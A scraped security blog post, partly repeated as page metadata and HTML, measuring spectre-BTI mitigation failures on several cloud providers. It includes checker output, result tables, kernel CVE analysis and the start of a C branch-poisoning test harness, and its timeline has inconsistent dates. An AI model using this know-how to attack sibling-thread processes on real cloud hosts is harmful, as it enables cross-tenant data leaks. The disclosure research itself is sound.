% Yes PRCTL 0.00 % 97.57 % No (1) This result might be a false negative, since repeating the experiment shows higher speculation rates as observed in the data collected.\nThe results show that the only effective mitigation in this machine is IBPB and that the PRCTL-based mitigation is ineffective due to lack of STIBP.\nResults for gcp-debian-10-haswell: We had a surprise though when after starting a Debian 10 machine in the same processor consistently allowed for an MSR write on the IA32_SPEC_CTRL register:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Checking for vulnerabilities on current system Kernel is Linux 4.19.0-22-cloud-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64 CPU is Intel(R) Xeon(R) CPU @ 2.30GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: YES (SPEC_CTRL feature bit) * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: YES (Intel STIBP feature bit) Mitigation NOSMT SMT Expected? No mitigation 99.81 % 93.45 % Yes IBRS 0.01 % 00.03 % Yes STIBP 99.63 % 0.02 % Yes IBPB 0.02 % 86.21 % Yes PRCTL 0.02 % 0.04 % (1) Yes (1) It is possible to see that the speculation rate is different than zero, but it is unclear if it’s measurement noise or an actual vulnerability as will be discussed later.\nObviously just changing the OS should not give different MSR values, since it is highly unlikely that the hypervisor would show a different behavior based on the OS (kernel). Our first guess was that when choosing a different OS we were getting into a different pool of machines. But that also seemed unlikely. We have decided to then upgrade the older system kernel, and oddly, saw the previous behavior again (but now we were certain we were in the same machine since the reboot was too fast for us to have had a live migration). Our next theory was that the different kernels were using different mitigation strategies (IBRS versus IBPB with STIBP). By starting the new upgraded system with ‘mitigations=off’ kernel parameter, we’ve noticed that we were now able again to write in the MSRs. We then tested the other machine, and indeed, with\n‘mitigations=off’, we were able to write to the MSRs.\nFurther investigation showed this behaviour was caused by a kernel bug as described by CVE 2023-1998.\nCVE 2023-1998: Spectre v2 SMT mitigations problem 16 Later research explains this behaviour due a bug in the Linux Kernel that prevents the guest to properly select STIBP as a mitigation when IBRS is choosed to protect the Kernel. The Bare metal haswell reports the cpu not being vulnerable to RETBLEED, but the CPU on google cloud reports RETBLEED as one of its bugs.\noxigenio2-result.txt:\nbugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_unknown\ngcp-n1-standard-2-intel_Haswell-result.txt\nbugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs mmio_stale_data retbleed\nThis forces the CPU on google cloud to choose IBRS as mitigation for the kernel. The bug lies in the logic of mitigation selection (https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196). The comments state that if the CPU is using IBRS, STIBP is not necessary wich is wrong, this is only valid for eIBRS.\n1 2 3 4 5 6 7 8 /* * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible, * STIBP is not required. */ if (!boot_cpu_has(X86_FEATURE_STIBP) || !smt_possible || spectre_v2_in_ibrs_mode(spectre_v2_enabled)) return; This explains why every read is 1 on google cloud guests and the mitigation is broken, since the read is done by msr kernel driver wich is set to IBRS on kernel entry and clear the SPEC_CTRL MSR on kernel exit, leaving the victim exposed to SMT attacks. It also explains why setting ‘mitigations=off’ allows the direct mitigation usign the msr module, since the SPEC_CTRL MSR is no longer modied when transitioning between kernel and user mode.\nTests on AWS EC2 The AWS EC2 instances don’t enumerate hardware mitigations, leading to SPEC_CTRL MSR being always 0 and IBPB not working:\nResults for aws-t2.medium: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Checking for vulnerabilities on current system Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64 CPU is Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: NO * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: NO * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: NO [...] Testing victim-PRCTL on core 0: prctl: Operation not permitted PRCTL GET value 0x2 Rate: 999/1000 MSR[72]=0 [...] Rate: 1000/1000 MSR[72]=0 Total misspredict rate: 9995/10000 (99.95 %) real\t0m1.827s user\t0m0.328s sys\t0m0.000s Mitigation NOSMT SMT Expected? No mitigation 99.86 % 0.09 % Yes IBRS 99.79 % 0.06 % Yes STIBP 99.89 % 0.11 % Yes IBPB 36.82 % 0.05 % No PRCTL 99.95 % 0.10 % No Since the enumeration using CPUID doesn’t show support for IBPB, the prctl syscall fails and no mitigations are applied. A similar result can be found for t3 instances.\nResults for aws-t3a.nano: EC2 t3a instances use AMD processors, showing that this problem is not exclusive to Intel processors. In the t3a instances tested it isn’t possible to read or write to the MSRs, and prctl also fails with operation not permitted error.\n1 2 3 4 5 6 7 8 9 10 11 12 Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64 CPU is AMD EPYC 7571 Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: NO * CPU indicates IBRS capability: NO * CPU indicates preferring IBRS always-on: NO * CPU indicates preferring IBRS over retpoline: NO * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: NO Mitigation NOSMT SMT Expected? No mitigation 76.58 % 99.87 % Yes IBRS 57.67 % 99.87 % No STIBP 28.44 % 99.92 % No IBPB 75.19 % 99.84 % No PRCTL 73.91 % 99.85 % No Tests on Azure Results for azure-d2sv3: The results for this machine are similar to the t3a instance. It’s impossible to read or write from any SPEC_CTRL MSRs and all scenarios are vulnerable, even though it’s a Haswell CPU.\nResults for azure-ubuntu22-F2s-v2: This machine contains a Xeon(R) Platinum 8272CL (Cascade Lake). Our tests show that Cascade Lake CPUs are highly resilient against SMT attacks. IBPB can’t be used on this VM, it’s not possible to read or write from SPEC_CTRL MSR and prctl fails. Given the tests show the system is not vulnerable, we conclude that the hardware mitigation is forced-enabled.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Checking for vulnerabilities on current system Kernel is Linux 5.15.0-1029-azure #36-Ubuntu SMP Mon Dec 5 19:31:08 UTC 2022 x86_64 CPU is Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: NO * CPU indicates IBRS capability: NO * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: NO * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: NO * CPU indicates STIBP capability: NO Mitigation NOSMT SMT Expected? No mitigation 98.81 % 0.01 % Yes IBRS 0.00 % 0.01 % No (1) STIBP 99.94 % 0.00 % Yes IBPB 99.94 % 0.01 % No PRCTL 99.90 % 0.00 % No (1) But not vulnerable, so we assume forced enabled\nTests on Oracle Cloud Intel CPUs tested on Oracle Cloud work as expected, but the AMD CPU tested only enumerates the IBPB mitigation, leaving sibling thread attacks exposed. Since the PRCTL can execute IBPB, the syscall succeeds, but it’s not enough to protect the process.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Kernel is Linux 5.15.0-1021-oracle #27-Ubuntu SMP Fri Oct 14 20:04:26 UTC 2022 x86_64 CPU is AMD EPYC 7551 32-Core Processor Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: NO * CPU indicates IBRS capability: NO * CPU indicates preferring IBRS always-on: NO * CPU indicates preferring IBRS over retpoline: NO * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (IBPB_SUPPORT feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: NO * CPU indicates STIBP capability: NO Testing victim-PRCTL on core 1: PRCTL GET value 0x9 rdmsr: CPU 1 cannot read reg 72 Rate: 1000/1000 MSR[72]=-1 [...] Rate: 1000/1000 MSR[72]=-1 Total misspredict rate: 9998/10000 (99.98 %) Tests on Digital Ocean The tested machines correctly enumerate the CPUs and allow MSR writes. We did observe a higher than expected hit rate with the IBPB usage. It is unexpected since, as we’ve stated in the beginning of the report, some hits were supposed to be seen due to the lack of synchronization, but what we saw was closer to 30% (versus \u003c1%). Given that IBPB does seem to be used, it might be something unrelated to the scope of this research so we’ve decided to report the observation versus investigating it further (notice that we had difficulties identifying the underlying hardware used as well).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Kernel is Linux 5.19.0-23-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 14 15:39:57 UTC 2022 x86_64 CPU is DO-Premium-AMD Hardware check * Hardware support (CPU microcode) for mitigation techniques * Indirect Branch Restricted Speculation (IBRS) * SPEC_CTRL MSR is available: YES * CPU indicates IBRS capability: NO * CPU indicates preferring IBRS always-on: NO * CPU indicates preferring IBRS over retpoline: NO * Indirect Branch Prediction Barrier (IBPB) * CPU indicates IBPB capability: YES (IBPB_SUPPORT feature bit) * Single Thread Indirect Branch Predictors (STIBP) * SPEC_CTRL MSR is available: YES * CPU indicates STIBP capability: YES (AMD STIBP feature bit) * CPU indicates preferring STIBP always-on: NO Mitigation NOSMT SMT Expected? No mitigation 0.04 % 0.41 % No IBRS 0.05 % 0.38 % No STIBP 0.14 % 0.25 % No IBPB 29.39 % 18.88 % No PRCTL 0.02 % 0.02 % No Conclusion The hardware mitigations for spectre-BTI provide different options for different scenarios. They also vary in performance impact and scope. Those mitigations are exposed to the applications via a kernel system call that abstracts some of the complexity (such as deciding if there are sibling threads or not on a system, if and which of the hardware mitigations are available and adequate, etc). Besides that, another level of abstraction is the hypervisor (which can expose or not the hardware features by filtering the cpuid output, or even control the MSR accesses and the understanding of sibling threads and cores). Each abstraction (hypervisor, kernel, hardware) has to properly work for the mitigation to be complete. Unfortunately, while the hardware interface is well documented, the kernel interface changes its default (like using IBRS versus STIBP/IBPB) and the hypervisor is dependent on the configuration (which is controlled by the different cloud providers, that DO NOT share their choices). That leads to a scenario in which the default configuration might be adequate for bare metal machines, but it is not (for different reasons) in the different cloud setups.\nGiven our research was not comprehensive (many different stances and offers were not tested) and the test method could be greatly improved, as well as some of the observed results could be more deeply analyzed, we are also sharing the raw data in the hopes to incentivize the community (and the security engineering teams of the companies) to look further.\nAcknowledgements We would like to thank Alexandra Sandulescu for the excellent feedback, discussions and for reviewing/editing this write-up.\nTool \u0026 source code The tool and results for multiple instances can be found at https://github.com/es0j/hyperbleed .\nTimeline December 01 2022 - Unexpected behavior on prctl detected December 30 2022 - CVE 2023-0045 reported to kernel security team January 01 2022 - CVE 2023-0045 fixed December 23 2022 - First version of this writeup December 26 2022 - Multiple tests performed on cloud providers December 28 2022 - KVM behavior better understood, more cloud provider tests December 31 2023 - Final write-up shared with AWS, Google, Oracle and Digital Ocean. No response until near the finish of 90 days embargo. February 20 2023 - CVE 2023-1998 spectre v2 SMT mitigations problem reported to kernel security team March 02 2023 - CVE 2023-0045 disclosed on google security research March 30 2023 - CVE 2023-1998 fixed April 12 2023 - CVE 2023-1998 disclosed on google security research May 29 2023 - Hyperbleed report published References: “Exec ASLR: Abusing Intel Branch Predictors to bypass ASLR”. Link: https://github.com/es0j/ExecASLR-ekoparty ↩︎\n“Reverse Branch Target Buffer Poisoning”. Link: https://cos.ufrj.br/uploadfile/publicacao/3061.pdf ↩︎\n“RET2ASLR - Leaking ASLR from return instructions” Link:https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr ↩︎\n“Branch Target Injection\". Link: https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html ↩︎\n“The Linux kernel user-space API guide: Speculation Control”. Link: https://docs.kernel.org/userspace-api/spec_ctrl.html ↩︎ ↩︎\n“Linux Source code” Link: https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970 ↩︎ ↩︎\n“Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 4: Model-Specific Registers” Link:https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf ↩︎\n“AMD64 Architecture Programmer’s Manual Volume 2:” Link:https://www.amd.com/system/files/TechDocs/24593.pdf ↩︎\n“Speculative Execution Side Channel Mitigations”. Link:https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf ↩︎\n“Speculative Execution Side Channel Mitigations” Link: https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html ↩︎ ↩︎ ↩︎\n“The Linux kernel user-space API guide: Speculation Control”. Link:https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html ↩︎\n“Linux Source code” Link:https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900 ↩︎\n“Seccomp” Link:https://man7.org/linux/man-pages/man2/seccomp.2.html ↩︎\n“Spectre Meltdown Checker” Link:https://github.com/speed47/spectre-meltdown-checker ↩︎\n“CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations”. Link:https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8 ↩︎\n“CVE 2023-1998 Spectre v2 SMT mitigations problem”. Link:https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx ↩︎\n","wordCount":"6351","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2023-05-29T00:00:00Z","dateModified":"2023-05-29T00:00:00Z","author":[{"@type":"Person","name":"bsdaemon"},{"@type":"Person","name":"esoj"}],"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/2023-05-29-hyperbleed-post/"},"publisher":{"@type":"Organization","name":"Blog do GRIS","logo":{"@type":"ImageObject","url":"http://localhost:1313/images/gris-logo-2020%27s_black.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="GRIS (Alt + H)"><img src=http://localhost:1313/images/gris-logo-2020%27s_black.png alt aria-label=logo height=35>GRIS</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/blog/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/busca/ title="Busca (Alt + /)" accesskey=/><span>Busca</span></a></li><li><a href=http://localhost:1313/categories/ title=Categories><span>Categories</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/blog/>Blogs</a></div><h1 class="post-title entry-hint-parent">Hyperbleed - Current state of spectre-BTI mitigations on cloud</h1><div class=post-description>Current state of spectre-BTI mitigations on cloud</div><div class=post-meta><span title='2023-05-29 00:00:00 +0000 UTC'>May 29, 2023</span>&nbsp;·&nbsp;30 min&nbsp;·&nbsp;6351 words&nbsp;·&nbsp;bsdaemon, esoj&nbsp;|&nbsp;<a href=https://github.com/grisufrj/grisufrj.github.io/tree/main/content/blog/2023-05-29-hyperbleed-post.en.md rel="noopener noreferrer" target=_blank>Sugerir mudanças</a></div></header><div class=post-content><h2 id=version-10>Version 1.0<a hidden class=anchor aria-hidden=true href=#version-10>#</a></h2><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>During our tests for reverse spectre attacks <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>, we have observed that the behavior of the spectre-BTI<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup> mitigations differs between a bare-metal and a cloud-based scenario.</p><p>The Linux kernel allows userspace processes to enable mitigations by calling prctl<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup> with the PR_GET_SPECULATION_CTRL which disables the speculation feature or by using seccomp<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>. The default behavior changed over time (from using IBPB/STIBP to IBRS).</p><p>We have measured that on some instances of Google, AWS, Azure and Oracle, the spectre-BTI mitigation using prctl still leaves the victim exposed to attacks in some cases. In this research, we tested multiple scenarios in an attempt to enumerate the causes of failure for the mitigations.</p><p>Note: The title <em>hyperbleed</em> is just a joke/meme/trolling and a way of internally tracking the bug.</p><h2 id=current-hardware-mitigations-and-their-software-interfaces-on-the-linux-kernel>Current Hardware Mitigations (and their software interfaces on the Linux Kernel)<a hidden class=anchor aria-hidden=true href=#current-hardware-mitigations-and-their-software-interfaces-on-the-linux-kernel>#</a></h2><p>The following IA32_SPEC_CTRL and IA32_PRED_CMD Model Specific Registers can be used to mitigate spectre-BTI<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>:</p><p><img loading=lazy src=https://i.imgur.com/cTKKs9S.png></p><p><img loading=lazy src=https://i.imgur.com/lSxNcMZ.png></p><p>AMD CPUs are compatible with those definitions <sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup>. For a complete breakdown on the different mitigations and the recommended usages, refer to Intel&rsquo;s guidance <sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup>.</p><h3 id=indirect-branch-restricted-speculation-ibrs>Indirect Branch Restricted Speculation (IBRS)<a hidden class=anchor aria-hidden=true href=#indirect-branch-restricted-speculation-ibrs>#</a></h3><p>IBRS is a hardware mitigation used to prevent code from a less privileged mode to control branches executed on a more privileged mode <sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>. This mitigation is used to prevent spectre-BTI attacks against higher privileged security domains, such as kernel or host in the case of a VMM.</p><p>To enable the mitigation it is necessary to perform a write on a Model Specific Register (IA32_SPEC_CTRL.IBRS = 1, or MSR_72[0]=1) every time a context change happens from an untrusted context.</p><p>IBRS can also be used to mitigate user-level attacks, according to Intel guidance <sup id=fnref1:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Additionally, when IA32_SPEC_CTRL.IBRS is set to 1 on any logical processors of that core, the predicted targets of indirect branches cannot be controlled by software that executes (or executed previously) on another logical processor of the same core.
</span></span></code></pre></td></tr></table></div></div><h3 id=enhanced-ibrs>Enhanced IBRS<a hidden class=anchor aria-hidden=true href=#enhanced-ibrs>#</a></h3><p>eIBRS supports an &lsquo;always on&rsquo; mode for the IBRS (so the bit has to be set only once) <sup id=fnref2:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>.</p><h3 id=single-thread-indirect-branch-predictors-stibp>Single Thread Indirect Branch Predictors (STIBP)<a hidden class=anchor aria-hidden=true href=#single-thread-indirect-branch-predictors-stibp>#</a></h3><p>STIBP prevents code from controlling branches executed on a sibling thread. STIBP doesn&rsquo;t restrict previous branches from controlling future branches, therefore an IBPB must also be used.</p><h3 id=indirect-branch-predictor-barrier-ibpb>Indirect Branch Predictor Barrier (IBPB)<a hidden class=anchor aria-hidden=true href=#indirect-branch-predictor-barrier-ibpb>#</a></h3><p>The IBPB is used to prevent future branches from being affected by old branches recorded before issuing IBPB. The IBPB isn&rsquo;t an operation mode but an instruction to clear (flush) the Branch Predictor Unit (BPU). It can be used to prevent untrusted software from controlling each other when executing at the same privilege level and same core. IBPB can be executed on process context switches to mitigate spectre-BTI.</p><h3 id=the-prctl-syscall-with-pr_set_speculation_ctrl-option>The PRCTL syscall with PR_SET_SPECULATION_CTRL option<a hidden class=anchor aria-hidden=true href=#the-prctl-syscall-with-pr_set_speculation_ctrl-option>#</a></h3><p>The prctl syscall allows the user to set mitigations for the current process <sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup>. The Linux kernel uses a combination of the previously discussed hardware mitigations to protect user processes against attacks from other user applications <sup id=fnref:12><a href=#fn:12 class=footnote-ref role=doc-noteref>12</a></sup>.</p><p>The mitigation for spectre-BTI can be enabled with:</p><p><code>prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0);</code></p><p>Similarly, the mitigation can be enabled inby using seccomp <sup id=fnref:13><a href=#fn:13 class=footnote-ref role=doc-noteref>13</a></sup><sup id=fnref1:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>:</p><p><code>syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);</code></p><h2 id=test-code>Test Code<a hidden class=anchor aria-hidden=true href=#test-code>#</a></h2><p>The test consists of two processes. The attacker constantly poisons an indirect call to speculatively redirect it to a target address. The victim process measures the mispredict rate and tries to mitigate the attack either by calling PRCTL or writing to the MSR directly using a kernel module that exposes MSR read and write operations to userspace.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-.c data-lang=.c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim test.c -O0 -masm=intel -w 		-DVICTIM 
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim-PRCTL test.c -O0 -masm=intel -w 	-DVICTIM  -DPRCTL
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim-nospecctrl test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim-IBRS test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=1
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim-STIBP test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=2
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o victim-IBPB test.c -O0 -masm=intel -w 	-DVICTIM  -DMSR  -DMSR_VAL=0 -DIBPB
</span></span></span><span class=line><span class=cl><span class=cm>gcc -o attacker test.c -O0 -masm=intel -w  
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;utils.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#ifndef PRINT_AMMOUNT
</span></span></span><span class=line><span class=cl><span class=cp>#define PRINT_AMMOUNT 1000
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#define IA32_SPEC_CTRL 72
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>rdiPtr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=n>unused</span><span class=p>[</span><span class=mh>0x500</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=n>probeArray</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>2</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=n>unuse2</span><span class=p>[</span><span class=mh>0x500</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>f1</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>poison</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>srcAddress</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>dstAddress</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>cpu</span><span class=p>)</span>
